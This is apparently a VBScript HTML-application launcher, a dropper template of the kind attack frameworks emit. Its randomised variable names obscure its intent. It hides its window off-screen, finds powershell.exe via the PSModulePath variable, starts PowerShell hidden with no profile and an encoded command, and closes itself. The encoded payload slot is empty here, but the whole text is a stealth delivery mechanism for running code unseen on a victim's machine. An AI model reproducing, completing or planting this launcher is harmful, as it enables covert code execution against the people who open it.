<script language="VBScript">
  window.moveTo -4000, -4000
  Set mNKZK = CreateObject("Wscript.Shell")
  Set n_FZz0Icw4Fi = CreateObject("Scripting.FileSystemObject")
  For each path in Split(mNKZK.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If n_FZz0Icw4Fi.FileExists(path + "\..\powershell.exe") Then
      mNKZK.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
